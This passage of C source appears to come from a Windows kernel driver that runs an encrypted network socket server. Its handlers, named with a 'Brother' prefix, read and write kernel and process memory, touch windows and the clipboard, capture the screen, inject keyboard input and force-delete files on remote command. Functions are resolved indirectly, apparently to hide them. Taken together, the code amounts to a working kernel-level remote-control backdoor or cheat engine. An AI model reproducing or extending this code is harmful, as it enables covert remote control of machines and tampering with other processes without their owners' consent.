		_FUNCTION_IMP(RunApcRunCode, Ret, pGData, s, pWorkInfo->Flags);





		//RunApcRunCodeDirect()


		//RUN_APC_ARG* Arg = &pSocketInfo->_RunApcArg;
		//PKKERNEL_ROUTINE pKer = 0;
		//_FUNCTION_ENTRY(RunApc, pKer, PKKERNEL_ROUTINE);
		//pKer(&pSocketInfo->_RunApcArg.Apc, (PKNORMAL_ROUTINE*)0, (PVOID *)0, (PVOID*)&Arg, (PVOID*)0);
		//FREE_FUNCTION_ENTRY(RunApc, pKer);

		//NTSTATUS status = 0;
		//_sendEncrypt uSendEncrypt = 0;
		//_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt, _sendEncrypt);
		//status = uSendEncrypt(pGData, Arg->s, 0x21212121, pSocketInfo->_RunApcArg.rBuffer, pSocketInfo->_RunApcArg.rLen);
		//FREE_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt);

		//if (!NT_SUCCESS(status))
		//{
		//	if (pSocket->AsyncContext.Irp != 0) {
		//		fNtos->IoFreeIrp(pSocket->AsyncContext.Irp);
		//		pSocket->AsyncContext.Irp = 0;
		//	}
		//	if (pSocketInfo->kSendBuffer.Mdl != 0) {
		//		fNtos->MmUnlockPages(pSocketInfo->kSendBuffer.Mdl);
		//		fNtos->IoFreeMdl(pSocketInfo->kSendBuffer.Mdl);
		//		pSocketInfo->kSendBuffer.Mdl = 0;
		//		fNtos->MmFreeNonCachedMemory(pSocketInfo->pSendBuffer, SEND_SIZE);
		//		pSocketInfo->pSendBuffer = 0;
		//	}
		//	if (pSocketInfo->kRecvBuffer.Mdl != 0)
		//	{
		//		fNtos->MmUnlockPages(pSocketInfo->kRecvBuffer.Mdl);
		//		fNtos->IoFreeMdl(pSocketInfo->kRecvBuffer.Mdl);
		//		pSocketInfo->kRecvBuffer.Mdl = 0;
		//		fNtos->MmFreeNonCachedMemory(pSocketInfo->pRecvBuffer, RECV_SIZE);
		//		pSocketInfo->pRecvBuffer = 0;
		//	}
		//	RemoveEntryList(&pSocketInfo->List.Link);
		//}


		//Ret

		//_FUNCTION_IMP(RunApcRunCode, Ret, _pGData, s, pWorkInfo->Flags);

		//pWorkInfo->pGData = pGData;
		//pWorkInfo->Buffer = pValue;
		//pWorkInfo->s = s;

		//ExInitializeWorkItem(&pWorkInfo->WorkQueueItem,
		//	(PWORKER_THREAD_ROUTINE)pGData->_WORKER_THREAD_ROUTINE.SelfTradition, &pSocketInfo->Worker);
		//fNtos->ExQueueWorkItem(&pWorkInfo->WorkQueueItem, RealTimeWorkQueue);
	//}


	//else if (pValue->Type == 8) {
	//	pValue->Error = GetWindowRect_User((HWND)pValue->pAdrSize, (LPRECTK)pValue->pVal);
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 9) {
	//	//StopFixPoint((HANDLE)pValue->pID);
	//	pValue->Error = ClientToScreen_Kernel((HWND)pValue->pAdrSize, (LPPOINT)pValue->pVal);
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 10) {
	//	//StopFixPoint((HANDLE)pValue->pID);
	//	ULONG wcharSize = 0;
	//	pValue->pAdrSize = GetClipboardData((HWND)pValue->pAdrSize, (wchar_t*)pValue->pVal, &wcharSize);
	//	pValue->pValSize = wcharSize;
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 11) {
	//	//StopFixPoint((HANDLE)pValue->pID);
	//	EmptyClipboardData();
	//	pValue->Error = 0;
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 12) {
	//	//StopFixPoint((HANDLE)pValue->pID);
	//	EmptyClipboardData();
	//	pValue->Error = SetClipboardData((HWND)pValue->pAdrSize, (wchar_t*)pValue->pVal, pValue->pValSize);
	//	return STATUS_SUCCESS;
	//}

	//else if (pValue->Type == 14) {
	//	//StopFixPoint((HANDLE)pValue->pID);
	//	DEVMODEW DevMod = { 0 };
	//	if (EnumDisplaySettingsExW(NULL, -1, &DevMod, 0) > 0) {
	//		LOG_DEBUG("EnumDisplaySettingsExW  r %d  %d\n", DevMod.dmPelsWidth, DevMod.dmPelsHeight);

	//		pValue->pAdrSize = DevMod.dmPelsWidth;
	//		pValue->pValSize = DevMod.dmPelsHeight;
	//	}
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 15) {
	//	//PAGE_READ
	//	pValue->Error = ClientToScreen_User((HWND)pValue->pAdrSize, (LPPOINT)pValue->pVal);
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 17) {
	//	//PAGE_READ
	//	pValue->Error = _Kernel_SetWindowLongPtr((HWND)pValue->pAdrSize, pValue->pAdr, pValue->pValSize, pValue->pVal);
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 16) {


	//	//PAGE_READ


	//	POINT P = { 0 };
	//	P.x = (pValue->pAdrSize >> 16) & 0xFFFF;
	//	P.y = pValue->pAdrSize & 0xFFFF;

	//	DWORD With = (pValue->pValSize >> 16) & 0xFFFF;
	//	DWORD Height = pValue->pValSize & 0xFFFF;


	//	LOG_DEBUG("x:%d y:%d with:%d  height:%d\n", P.x, P.y, With, Height);




	//	if (With * Height * 4 > SEND_SIZE) {
	//		pValue->pValSize = 0;
	//		return STATUS_SUCCESS;
	//	}
	//	//  PVOID rBuffer = ExAllocatePoolWithTag(PagedPool, With * Height * 4, 'Tag');
	//	pValue->pValSize = PrintPicture(P, With, Height, pValue->pVal);
	//	LOG_DEBUG("nSize %d:\n", pValue->pValSize);
	//	// RtlCopyMemory(pValue->pVal, rBuffer, pValue->pValSize);
	//	// ExFreePoolWithTag(rBuffer, 'Tag');

	//	return STATUS_SUCCESS;

	//}



	//_Kernel_SetWindowLongPtr
	//STATUS_NOT_SUPPORTED
	return pValue->Error;
}


typedef struct _KERNEL_FUN {
	KIRQL  Irql;
	DWORD  ModType;  // 查看哪个模块
	LPCSTR CallName;



}KERNEL_FUN;


NTSTATUS NTAPI Brother_CALL_FUN(PVOID _pGData, SOCKET s, LPIOINFO pValue) {


	NTSTATUS rError = STATUS_SUCCESS;
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)_pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)_pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)_pGData)->SelfAArry;

	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[s];
	PKSOCKET pSocket = &pGData->wsk.bWsk.kSocket[s];







	return STATUS_SUCCESS;
}


NTSTATUS Brother_File(PVOID _pGData, SOCKET s, LPIOINFO pValue) {

	//ExFreePoolWithTag()
	//LOG_DEBUG("Brother_File PID:%d Type :%d\n", pValue->pID, pValue->Type);


	//PVOID addr = 0;

	//size_t size = 0x700;

	//NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//if (NT_SUCCESS(status))
	//{
	//	RtlZeroMemory(addr, size);
	//	LOG_DEBUG("ZwAllocateVirtualMemory sucess\n");
	//	//size = 0;
	//	//status = ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
	//	//LOG_DEBUG("ZwAllocateVirtualMemory %08X\n", status);
	//	//size = 0;
	//	//status = ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
	//	//LOG_DEBUG("ZwAllocateVirtualMemory %08X\n", status);
	////	STATUS_ABANDONED
	//}


	NTSTATUS rError = STATUS_SUCCESS;
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)_pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)_pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)_pGData)->SelfAArry;


	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[s];
	PKSOCKET pSocket = &pGData->wsk.bWsk.kSocket[s];

	DWORD64 Ret = 0;

	if (pValue->Type == 0)
	{
		//UNICODE_STRING str;
		//size_t gLen = wcslen((wchar_t*)pValue->pAdr);
		//wchar_t* r = (wchar_t*)ExAllocatePoolWithTag(PagedPool, (gLen + 1) * 2, 'tag');
		//RtlZeroMemory(r, (gLen + 1) * 2);
		//RtlCopyMemory(r, pValue->pAdr, gLen * 2);
		//RtlInitUnicodeString(&str, r);
		//AddFileName(pValue->pID, &str);
	}
	else if (pValue->Type == 1)
	{
		//UNICODE_STRING str;
		//size_t gLen = wcslen((wchar_t*)pValue->pAdr);
		//wchar_t* r = (wchar_t*)ExAllocatePoolWithTag(PagedPool, (gLen + 1) * 2, 'tag');
		//RtlZeroMemory(r, (gLen + 1) * 2);
		//RtlCopyMemory(r, pValue->pAdr, gLen * 2);
		//RtlInitUnicodeString(&str, r);
		////DelFileName(pValue->pID, &str);
		//ExFreePoolWithTag(r, 'tag');
	}
	else if (pValue->Type == 2)
	{
		//UNICODE_STRING str;
		size_t gLen = pValue->pAdrSize + 2;  //wcslen((wchar_t*)pValue->pAdr);

		if (gLen >= MAX_PATH)
		{
			return 0;
		}

		wchar_t* r = (wchar_t*)fNtos->ExAllocatePoolWithTag(PagedPool, gLen, 'tag');

		if (r == NULL)
		{
			return STATUS_SUCCESS;
		}

		fNtos->memset(r, 0, gLen);

		//RtlZeroMemory(r, (gLen + 1) * 2);

		fNtos->CopyMemory(r, pValue->pAdr, pValue->pAdrSize);


		_FUNCTION_IMP(ForceDeleteFile, Ret, pGData, r);

		//	DeviceDosPathToNtPath(pValue->pAdr, r);
		//ForceDeleteFile(r);
		//DelFileName(pValue->pID, &str);
		fNtos->ExFreePoolWithTag(r, 'tag');
	}
	//
	return STATUS_SUCCESS;
}



int sendEncrypt(PVOID _pGData, SOCKET s, uint32_t Sgin, void* pBuffer, uint32_t nLen)
{
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	SELF_F_ARRY* fArry = &pGData->SelfFArry;
	WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	char* Buffer = 0;
	
	if (pBuffer == 0) {
		Buffer = WskInfo->_SocketArry[s].pSendBuffer;
	}
	else
	{
		Buffer = (char*)pBuffer - 12;
	}
	if (Buffer == 0)
	{

		return -1;
	}

	LPMSGCOMMON pCommon = (LPMSGCOMMON)Buffer;

	pCommon->len = nLen + 12;
	pCommon->sgin = Sgin;

	SOCKET_INFO* pS_INFO = &WskInfo->_SocketArry[s];

	__hEncrypt u_hEncrypt = (__hEncrypt)pGData->_hEncrypt.SelfTradition;
	//_FUNCTION_ENTRY(_hEncrypt, u_hEncrypt, __hEncrypt);
	pCommon->checknum = u_hEncrypt(0, pS_INFO->wKey,&pCommon->sgin, pCommon->len - 8);
	//FREE_FUNCTION_ENTRY(_hEncrypt, u_hEncrypt);

	WSK_BUF* WskBuffer = &pS_INFO->kSendBuffer;

	WskBuffer->Length = pCommon->len;


	LOG_DEBUG_CODE(AArry->SendLenth.Ptr, __LINE__, s, WskBuffer->Length);

	//MEMORY_FLAGS MFlags;
	_SendRecvFromEx uSendRecvFromEx = 0;
	MEMORY_FLAGS MFlags;
	_FUNCTION_ENTRY(SendRecvFromEx, MFlags, _SendRecvFromEx);
	pS_INFO->Status = ((_SendRecvFromEx)MFlags.Ptr)(pGData, s, WskBuffer, 1);
	FREE_FUNCTION_ENTRY(SendRecvFromEx, MFlags);

	//_SendRecvFromEx uSendRecvFromEx = (_SendRecvFromEx)pGData->FAllocateMemory(pGData, &fArry->SendRecvFromEx);
	//if (uSendRecvFromEx != 0){
	//	pS_INFO->Status = uSendRecvFromEx(pGData, s, WskBuffer, 1);
	//	fNtos->MmFreeContiguousMemory((PVOID)uSendRecvFromEx);
	//	//fNtos->IoFreeMdl(pMdl);
	//}

	//_FUNCTION_ENTRY(SendRecvFromEx, uSendRecvFromEx, _SendRecvFromEx);
	
	//FREE_FUNCTION_ENTRY(SendRecvFromEx, uSendRecvFromEx);
	

	return pS_INFO->Status;
}



typedef	struct _SOCKET_UNICODESTRING_INFO {
	int offset[2];
	int Size[2];
}SOCKET_UNICODESTRING_INFO;

DWORD64  IOSocketBuffer(PVOID _pGData, SOCKET s, DWORD IOMajor, LPIOINFO pInfo, char* rBuffer) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	SELF_F_ARRY* fArry = &pGData->SelfFArry;
	WSK_SERVER_INFO* WskInfo = &pGData->wsk;

	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;
	//LPIOINFO gIoBuffer = (LPIOINFO)rBuffer;
	//fNtos->CopyMemory(gIoBuffer, pInfo, sizeof(IOINFO));
	SOCKET_INFO* sInfo = &pGData->wsk._SocketArry[s];

	//fNtos->ExSetTimerResolution(0, FALSE);

	pGData->sTime = fNtos->KeQueryPerformanceCounter(0);
	LOG_DEBUG_TIME(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pGData->sTime.QuadPart, pGData->sTime.QuadPart - pGData->KTime.QuadPart);
	pGData->KTime = fNtos->KeQueryPerformanceCounter(0);

	MEMORY_FLAGS MFlags;
	_sendEncrypt usendEncrypt = 0;
	_FUNCTION_ENTRY(sendEncrypt, MFlags, _sendEncrypt);


	pGData->sTime = fNtos->KeQueryPerformanceCounter(0);
	LOG_DEBUG_TIME(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pGData->sTime.QuadPart, pGData->sTime.QuadPart - pGData->KTime.QuadPart);
	pGData->KTime = fNtos->KeQueryPerformanceCounter(0);
	//do
	//{
	//	_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt, _sendEncrypt);
	//} while (uSendEncrypt == 0);

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, usendEncrypt, 0);

	//DWORD64 ret = uSendEncrypt(_pGData, s, 0x21212121, rBuffer, sizeof(IOINFO));

	DWORD64 Ret = 0;


	if (IOMajor == BROTHER_DRIVERCODE_MEMORY) {


		LPIOINFO gIoBuffer = (LPIOINFO)rBuffer;
		fNtos->CopyMemory(gIoBuffer, pInfo, sizeof(IOINFO));

		int Rlen = sizeof(IOINFO);
		int nSize = 0;
		if (gIoBuffer->Type == KERNEL_WRITE || gIoBuffer->Type == KERNEL_STACK_WRITE) {
			gIoBuffer->pVal = (void*)((DWORD64)pInfo + sizeof(IOINFO)); // 数据
		}
		else if (gIoBuffer->Type == KERNEL_READ || gIoBuffer->Type == KERNEL_STACK_READ) {
			gIoBuffer->pVal = (void*)((DWORD64)gIoBuffer + sizeof(IOINFO)); // 返回数据
		}
		else if (gIoBuffer->Type == KERNEL_READ_LIST) {
			gIoBuffer->pVal = (void*)((DWORD64)gIoBuffer + sizeof(IOINFO)); // 返回数据
			nSize = LOWORD(gIoBuffer->pValSize);
		}
		else if (gIoBuffer->Type == KERNEL_READ_OFFSET) {
			gIoBuffer->pVal = (void*)((DWORD64)gIoBuffer + sizeof(IOINFO)); // 返回数据
		}else if (gIoBuffer->Type == KERNEL_READ_NEWWORLD_1 || gIoBuffer->Type == KERNEL_READ_NEWWORLD_3) {
			gIoBuffer->pAdr = (void*)((DWORD64)pInfo + sizeof(IOINFO));  // 数据
			gIoBuffer->pVal = (void*)((DWORD64)gIoBuffer + sizeof(IOINFO)); // 输出文本
		}
		else if (gIoBuffer->Type == KERNEL_READ_NEWWORLD_2) {
			gIoBuffer->pAdr = (void*)((DWORD64)pInfo + sizeof(IOINFO));  // 数据
			gIoBuffer->pVal = (void*)((DWORD64)gIoBuffer + sizeof(IOINFO)); // 输出文本
		}
		else if (gIoBuffer->Type == KERNEL_READ_MEMORY_0 || gIoBuffer->Type == KERNEL_READ_MEMORY_1) {
			gIoBuffer->pAdr = (void*)((DWORD64)pInfo + sizeof(IOINFO));  // 数据
			gIoBuffer->pVal = (void*)((DWORD64)gIoBuffer + sizeof(IOINFO)); // 输出文本
		}
		pGData->sTime = fNtos->KeQueryPerformanceCounter(0);
		LOG_DEBUG_TIME(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pGData->sTime.QuadPart, pGData->sTime.QuadPart - pGData->KTime.QuadPart);
		pGData->KTime = fNtos->KeQueryPerformanceCounter(0);

		_FUNCTION_IMP(Brother_Memory, Ret, pGData, s, gIoBuffer);

		pGData->sTime = fNtos->KeQueryPerformanceCounter(0);
		LOG_DEBUG_TIME(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pGData->sTime.QuadPart, pGData->sTime.QuadPart - pGData->KTime.QuadPart);
		pGData->KTime = fNtos->KeQueryPerformanceCounter(0);

		gIoBuffer->Error = (DWORD)Ret;
		if (gIoBuffer->Error == 0)
		{
			if (gIoBuffer->Type > 0x1000) {
				Rlen += gIoBuffer->pValSize;
			}
			if (gIoBuffer->Type == KERNEL_READ || 
				gIoBuffer->Type == KERNEL_STACK_READ ||
				gIoBuffer->Type == KERNEL_READ_OFFSET) {
				Rlen += gIoBuffer->pAdrSize;
			}
			else if (gIoBuffer->Type == KERNEL_READ_LIST) {
				Rlen += (LOWORD(gIoBuffer->pValSize) * nSize);
			}
		}

		//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, usendEncrypt, gIoBuffer->Error);;
		if (gIoBuffer->Error != 0x102)
		{
			pGData->sTime = fNtos->KeQueryPerformanceCounter(&pGData->Time);
			LOG_DEBUG_TIME(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pGData->sTime.QuadPart, pGData->Time);
			pGData->KTime = fNtos->KeQueryPerformanceCounter(0);
			//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, usendEncrypt, gIoBuffer->Error);
			Ret = usendEncrypt(pGData, s, 0x21212121, rBuffer, Rlen);
			//pGData->sTime = fNtos->KeQueryPerformanceCounter(0);
			//LOG_DEBUG_TIME(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pGData->sTime.QuadPart, pGData->sTime.QuadPart - pGData->KTime.QuadPart);
			//pGData->KTime = fNtos->KeQueryPerformanceCounter(0);
		}
		else
		{
			//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, usendEncrypt, gIoBuffer->Error);
			pInfo->Type |= 0x100;
			WORKER_T_INFO* pWorkInfo = &WskInfo->_SocketArry[s].TWorker;
			ULONG Time = fNtos->ExSetTimerResolution(fNtos->MinTimerRound, TRUE);
			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, usendEncrypt, Time);
			ExInitializeWorkItem(&pWorkInfo->WorkQueueItem, (PWORKER_THREAD_ROUTINE)pGData->_Work_Memory.SelfTradition, pWorkInfo);
			fNtos->ExQueueWorkItem(&pWorkInfo->WorkQueueItem, CriticalWorkQueue);
		}



		//else if(gIoBuffer->Type == KERNEL_READ || 
		//	gIoBuffer->Type == KERNEL_WRITE)
		//{
		//	gIoBuffer->Type |= 0X100;
		//	WORKER_T_INFO* pWorkInfo = &WskInfo->_SocketArry[s].TWorker;
		//	fNtos->ExSetTimerResolution(10000, TRUE);
		//	ExInitializeWorkItem(&pWorkInfo->WorkQueueItem, (PWORKER_THREAD_ROUTINE)pGData->_Work_Memory.SelfTradition, pWorkInfo);
		//	fNtos->ExQueueWorkItem(&pWorkInfo->WorkQueueItem, HyperCriticalWorkQueue);
		//}
		//else
		//{
		//	Ret = usendEncrypt(pGData, s, 0x21212121, rBuffer, Rlen);
		//}
	}
	else if (IOMajor == BROTHER_DRIVERCODE_PROCESS) {

		LPIOINFO gIoBuffer = (LPIOINFO)rBuffer;
		fNtos->CopyMemory(gIoBuffer, pInfo, sizeof(IOINFO));
		if (gIoBuffer->Type == 9) {
			gIoBuffer->pAdr = (void*)((DWORD64)pInfo + sizeof(IOINFO));
			gIoBuffer->pVal = (void*)((DWORD64)gIoBuffer + sizeof(IOINFO));


			_FUNCTION_IMP(Brother_Process, Ret, pGData, s, gIoBuffer);
			gIoBuffer->Error = (DWORD)Ret;

			//gIoBuffer->Error = Brother_Process(gIoBuffer);
			Ret = usendEncrypt(pGData, s, 0x21212121, rBuffer, sizeof(IOINFO) + gIoBuffer->pValSize);
		}
		else
		{
			_FUNCTION_IMP(Brother_Process, Ret, pGData, s, gIoBuffer);
			//gIoBuffer->Error = Brother_Process(gIoBuffer);
			//sendEncrypt(s, 0x21212121, rBuffer, sizeof(IOINFO));
			Ret = usendEncrypt(pGData, s, 0x21212121, rBuffer, sizeof(IOINFO));
		}


	}
	else if (IOMajor == BROTHER_DRIVERCODE_WINDOWS) {
		LPIOINFO gIoBuffer = (LPIOINFO)rBuffer;
		fNtos->CopyMemory(gIoBuffer, pInfo, sizeof(IOINFO));
		
		//LOG_DEBUG("Windows Type  %d\n", gIoBuffer->Type);

		if (gIoBuffer->Type == 7) {
			//LOG_DEBUG("Windows Type  %d\n", gIoBuffer->Type);
			char* Begin = (char*)((DWORD64)pInfo + sizeof(IOINFO));
			SOCKET_UNICODESTRING_INFO* pSizeInfo = (SOCKET_UNICODESTRING_INFO*)Begin;

			//LOG_DEBUG(" %d  %d %d %d\n", pSizeInfo->Size[0], pSizeInfo->Size[1],
			//	pSizeInfo->offset[0], pSizeInfo->offset[1]);

			if (pSizeInfo->Size[0] < 0 || pSizeInfo->Size[0]>256) {
				gIoBuffer->pAdrSize = 0;
			}
			else {
				gIoBuffer->pAdr = Begin + pSizeInfo->offset[0];
				gIoBuffer->pAdrSize = pSizeInfo->Size[0];
			}
			if (pSizeInfo->Size[1] < 0 || pSizeInfo->Size[1]>256) {
				gIoBuffer->pValSize = 0;
			}
			else
			{
				gIoBuffer->pVal = Begin + pSizeInfo->offset[1];
				gIoBuffer->pValSize = pSizeInfo->Size[1];
			}




			//LOG_DEBUG("%ws  %ws\n", gIoBuffer->pAdr, gIoBuffer->pVal);
		}
		if (gIoBuffer->Type == 8 || gIoBuffer->Type == 9 || gIoBuffer->Type == 15) {
			gIoBuffer->pVal = &gIoBuffer->pAdr;
		}
		if (gIoBuffer->Type == 10) {
			gIoBuffer->pVal = (void*)((DWORD64)gIoBuffer + sizeof(IOINFO));
			gIoBuffer->pValSize = 0;
			//gIoBuffer->Error = Brother_Window(gIoBuffer);
			//sendEncrypt(s, 0x21212121, rBuffer, sizeof(IOINFO) + gIoBuffer->pValSize);
			//goto TOEND;

		}
		if (gIoBuffer->Type == 12) {
			gIoBuffer->pVal = (void*)((DWORD64)pInfo + sizeof(IOINFO));
			//gIoBuffer->Error = Brother_Window(gIoBuffer);
		}
		if (gIoBuffer->Type == 16) {
			gIoBuffer->pVal = (void*)((DWORD64)gIoBuffer + sizeof(IOINFO));//(void*)((DWORD64)pInfo + sizeof(IOINFO));
			//gIoBuffer->Error = Brother_Window(gIoBuffer);
			//sendEncrypt(s, 0x21212121, rBuffer, sizeof(IOINFO) + gIoBuffer->pValSize);
			//goto TOEND;
		}
		//gIoBuffer->Error = Brother_Window(gIoBuffer);
		//sendEncrypt(s, 0x21212121, rBuffer, sizeof(IOINFO));
		//goto TOEND;

		_FUNCTION_IMP(Brother_Window, Ret, pGData, s, gIoBuffer);
		gIoBuffer->Error = (DWORD)Ret;

	}
	else if (IOMajor == BROTHER_DRIVERCODE_MOUDLE) {

		LPIOINFO gIoBuffer = (LPIOINFO)rBuffer;
		fNtos->CopyMemory(gIoBuffer, pInfo, sizeof(IOINFO));
		if (gIoBuffer->Type == 0) {
			gIoBuffer->pAdr = (void*)((DWORD64)pInfo + sizeof(IOINFO));
			gIoBuffer->pVal = (void*)((DWORD64)gIoBuffer + sizeof(IOINFO));
		}
		_FUNCTION_IMP(Brother_Moudle, Ret, pGData, s, gIoBuffer);
		gIoBuffer->Error = (DWORD)Ret;

		//gIoBuffer->Error = Brother_Moudle(gIoBuffer);
		//sendEncrypt(s, 0x21212121, rBuffer, sizeof(IOINFO));
	}
	else if (IOMajor == BROTHER_DRIVERCODE_KEYBORAD) {
		LPIOINFO gIoBuffer = (LPIOINFO)rBuffer;
		fNtos->CopyMemory(gIoBuffer, pInfo, sizeof(IOINFO));

		if (gIoBuffer->Type == 5 || gIoBuffer->Type == 6) {
			gIoBuffer->pAdr = (void*)((DWORD64)pInfo + sizeof(IOINFO));
		}

		_FUNCTION_IMP(Brother_KeyBoard, Ret, pGData, s, gIoBuffer);
		gIoBuffer->Error = (DWORD)Ret;

		//gIoBuffer->Error = Brother_KeyBoard(gIoBuffer);
		//sendEncrypt(s, 0x21212121, rBuffer, sizeof(IOINFO));
		//goto TOEND;
	}
	else if (IOMajor == BROTHER_DRIVERCODE_FILE) {


		LPIOINFO gIoBuffer = (LPIOINFO)rBuffer;
		fNtos->CopyMemory(gIoBuffer, pInfo, sizeof(IOINFO));
		gIoBuffer->pAdr = (void*)((DWORD64)pInfo + sizeof(IOINFO));


		_FUNCTION_IMP(Brother_File, Ret, pGData, s, gIoBuffer);
		gIoBuffer->Error = (DWORD)Ret;

		//gIoBuffer->Error = Brother_File(gIoBuffer);
		// 
		// 
		//sendEncrypt(s, 0x21212121, rBuffer, sizeof(IOINFO));
		usendEncrypt(_pGData, s, 0x21212121, rBuffer, sizeof(IOINFO));
		//goto TOEND;
	}
	//else if (IOMajor == BROTHER_DRIVERCODE_MUTEX) {
	//	LPIOINFO gIoBuffer = (LPIOINFO)rBuffer;
	//	RtlCopyMemory(gIoBuffer, pInfo, sizeof(IOINFO));
	//	gIoBuffer->Error = Brother_Mutex(gIoBuffer);
	//	sendEncrypt(s, 0x21212121, rBuffer, sizeof(IOINFO));
	//	goto TOEND;
	//}
	//else
	//{
	//	LPIOINFO gIoBuffer = (LPIOINFO)rBuffer;
	//	RtlCopyMemory(gIoBuffer, pInfo, sizeof(IOINFO));
	//	sendEncrypt(s, 0x21212121, rBuffer, sizeof(IOINFO));
	//	goto TOEND;
	//}


























	FREE_FUNCTION_ENTRY(sendEncrypt, MFlags);

	return 0;
}




DWORD64 hBufferSocket(PVOID _pGData, SOCKET s, char* pBuffer, uint32_t nLen) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	SELF_F_ARRY* fArry = &pGData->SelfFArry;
	WSK_SERVER_INFO* WskInfo = &pGData->wsk;

	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	DWORD64 Ret = 0;

	pGData->sTime = fNtos->KeQueryPerformanceCounter(0);
	LOG_DEBUG_TIME(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pGData->sTime.QuadPart, pGData->sTime.QuadPart - pGData->KTime.QuadPart);
	pGData->KTime = fNtos->KeQueryPerformanceCounter(0);


	MEMORY_FLAGS MFlags;
	_sendEncrypt usendEncrypt = 0;
	_FUNCTION_ENTRY(sendEncrypt, MFlags, _sendEncrypt);

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, usendEncrypt, s);
	do
	{

		if (nLen < (sizeof(MSGCOMMON) - 4)) {
			Ret = usendEncrypt(pGData, s, 0xC0000001, NULL, 0);
			break;
		}
		LPMSGCOMMON pCommon = (LPMSGCOMMON)pBuffer;
		if (pCommon->len != nLen) {
			Ret = usendEncrypt(pGData, s, 0xC0000002, NULL, 0);
			break;
		}

		//LOG_DEBUG("pCommon->sgin  %08X \n", pCommon->sgin);
		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, usendEncrypt, pCommon->sgin);
		if (pCommon->sgin == 0x80001000) {

			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
			//	__LINE__, uSendEncrypt, s);

			char* Buffer = WskInfo->_SocketArry[s].pSendBuffer;
			IOINFO* rInfo = (IOINFO*)( Buffer + 12);
			if (WskInfo->_SocketArry[s].wKey == 0)
			{
				LARGE_INTEGER tick_count;
				//ULONG myinc = KeQueryTimeIncrement();
				KeQueryTickCount(&tick_count);
				//tick_count.QuadPart *= myinc;
				//tick_count.QuadPart /= 10000;
				WskInfo->_SocketArry[s].wKey = (uint32_t)tick_count.QuadPart;
			}
			//rInfo->pAdr = 0;
			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, usendEncrypt, WskInfo->_SocketArry[s].wKey);
			
			fNtos->CopyMemory(&rInfo->pAdr, &WskInfo->_SocketArry[s].wKey, sizeof(DWORD));
			
			Ret = usendEncrypt(pGData, s, 0x80002000, rInfo, sizeof(IOINFO));

			//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
			//	__LINE__, uSendEncrypt, s);
			break;
		}
		//Ret = uSendEncrypt(_pGData, s, 0xC0000009, NULL, 0);
		//break;
		LPMSGCOMMON Msg = (LPMSGCOMMON)pBuffer;
		__hEncrypt u_hEncrypt = (__hEncrypt)pGData->_hEncrypt.SelfTradition;
		//_FUNCTION_ENTRY(_hEncrypt, u_hEncrypt, __hEncrypt);
		uint32_t Check  = u_hEncrypt(_pGData, WskInfo->_SocketArry[s].wKey, &Msg->sgin, Msg->len - 8);
		//FREE_FUNCTION_ENTRY(_hEncrypt, u_hEncrypt);
		
		if (Check != Msg->checknum){
			Ret = (DWORD64)-1;
			break;
		}

		__hEncrypt_DEC u_hEncrypt_DEC = (__hEncrypt_DEC)pGData->_hEncrypt_DEC.SelfTradition;
		//_FUNCTION_ENTRY(_hEncrypt_DEC, u_hEncrypt_DEC, __hEncrypt_DEC);
		u_hEncrypt_DEC(_pGData, WskInfo->_SocketArry[s].wKey, &Msg->common, Msg->len - 12);
